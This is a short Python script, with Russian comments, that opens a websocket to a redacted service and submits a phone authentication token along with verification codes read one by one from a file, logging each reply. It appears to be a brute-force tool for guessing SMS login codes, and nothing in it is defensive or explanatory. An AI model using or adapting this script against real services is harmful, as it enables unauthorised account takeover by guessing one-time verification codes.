import asyncio
import websockets
import json
import time



@asyncio.coroutine
def test(code):
    websocket = yield from websockets.connect('wss://*********/websocket')
    request = json.dumps({"ver":10,"cmd":0,"seq":4,"opcode":18,"payload":{"authTokenType":"PHONE","token":"Ahl6a_4WW9E3ECmfYQH2hnOYZ_D4Hs5z-EUupHx9qZ9so71SNtKV91LOzyLEo1S3vKuqqUUxT-CrngayKgGmTxw","verifyCode":"%s" % code}
                          })
    yield from websocket.send(request)
    response = yield from websocket.recv()
    with open("response.txt",'a') as f:  #сюда скрипт складывает ответы
      f = f.write(str(code)+" - "+str(response)+"\n")
    print(response)
    print(code)


with open("code.txt", "r") as file: #из файла скрипт забирает коды
    codes = file.read().split("\n")
    for code in codes:
        asyncio.get_event_loop().run_until_complete(test(code))
        time.sleep(0.000000000001)
